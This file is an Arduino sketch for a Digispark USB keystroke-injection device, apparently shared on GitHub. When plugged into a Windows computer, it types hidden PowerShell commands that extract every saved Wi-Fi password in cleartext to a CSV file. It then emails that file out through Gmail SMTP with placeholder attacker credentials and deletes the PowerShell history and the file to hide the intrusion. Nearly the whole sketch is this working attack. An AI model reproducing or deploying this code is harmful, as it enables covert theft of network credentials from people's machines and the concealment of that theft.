/***************************************************
 * Name : Nikhil Gupta
 * Email: gnikhil@email.com
 * github:github.com/nikhil2791998
 * Contact: (+91) 9558720468
***************************************************/

#include "DigiKeyboard.h"


char emailid[] = "YourEmail";
char pass[] = "YourPassword";
char title[] = "EnterAnyTitle";
char body[]= "AnyBodyData";

void nsetup(){
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);/*
  DigiKeyboard.print("MODE CON: COLS=15 LINES=5");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);*/
  DigiKeyboard.print("COLOR 0A");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_F11);
  
}

void setup() {  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  nsetup();
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv temp.csv"));
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  nsetup();
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('"));
  DigiKeyboard.print(emailid);
  DigiKeyboard.print(F("',\'"));
  DigiKeyboard.print(pass);
  DigiKeyboard.print(F("'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = '"));
  DigiKeyboard.print(emailid);
  DigiKeyboard.print(F("@gmail.com'; $ReportEmail.To.Add('"));
  DigiKeyboard.print(emailid);
  DigiKeyboard.print(F("@gmail.com'); $ReportEmail.Subject = '"));
  DigiKeyboard.print(title);
  DigiKeyboard.print(F("'; $ReportEmail.Body = '"));
  DigiKeyboard.print(body);
  DigiKeyboard.print(F("'; $ReportEmail.Attachments.Add('temp.csv'); $SMTPInfo.Send($ReportEmail)\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  nsetup();
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"del (Get-PSReadlineOption).HistorySavePath\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  nsetup();
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("del temp.csv"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  digitalWrite(0, HIGH);   // turn the LED on (HIGH is the voltage level)
  digitalWrite(1, HIGH);
  delay(1000);               // wait for a second
  digitalWrite(0, LOW);    // turn the LED off by making the voltage LOW
  digitalWrite(1, LOW); 
  delay(1000);               // wait for a second
}
